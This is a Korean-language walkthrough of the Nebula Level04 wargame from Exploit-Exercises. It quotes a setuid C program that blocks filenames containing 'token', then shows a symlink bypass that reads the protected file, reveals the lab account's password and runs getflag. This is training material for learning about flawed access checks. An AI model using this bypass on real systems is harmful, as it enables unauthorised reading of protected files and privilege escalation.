# Exploit-exercise Nebula Level04
```
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.
```

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

`token` 파일을 읽으면 `flag04` 계정의 비밀번호를 얻을 수 있다고 한다.

`cd /home/flag04/` 명령어를 통해서 `flag04` 계정의 홈 디렉토리로 이동한 후, `ls` 을 통해 확인하면
```
flag04  token
```
다음과 같이 flag04 과 token 파일을 확인할 수 있다.

`./flag04 ./token` 을 입력하여 token 파일을 읽어보려고 했으나,

```
You may not access './token'
```
이라며 거절한다.


그렇다면 [심볼릭 링크]()를 통해서 문제를 풀면 된다.
```
ln -s /home/flag04/token /home/level04/aaa
```
다음과 같이 입력하여 token 파일을 가리키는 aaa 파일을 만들고,

```
/home/flag04/flag04 /home/level04/aaa
```
을 입력하게 되면, 

```
06508b5e-8909-4f38-b630-fdb148a848a2
```
라고 뜨고, 이 비밀번호를 가지고 `flag04` 유저로 로그인을 할 수 있고,

`flag04` 계정으로 로그인한 뒤, `getflag` 를 입력하면

```
You have successfully executed getflag on a target account
```

라고 뜨면서 풀리게 된다.